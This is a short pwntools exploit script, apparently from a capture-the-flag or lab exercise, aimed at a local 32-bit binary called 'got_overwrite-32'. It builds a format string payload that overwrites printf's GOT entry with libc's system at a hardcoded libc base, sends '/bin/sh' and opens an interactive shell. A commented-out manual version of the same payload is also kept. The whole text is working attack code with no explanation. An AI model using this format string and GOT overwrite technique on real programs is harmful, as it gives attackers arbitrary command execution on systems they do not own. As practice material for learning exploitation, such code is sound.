from pwn import *

elf = context.binary = ELF('./got_overwrite-32')
p = process()

libc = elf.libc
libc.address = 0xf7c00000

# p.sendline(flat(
#     elf.got['printf'],
#     b'x' * (libc.sym['system'] - 4),
#     b'%5$n'
# ))
p.sendline(fmtstr_payload(5, {elf.got['printf']: libc.sym['system']}))
p.sendline(b'/bin/sh')
p.interactive()
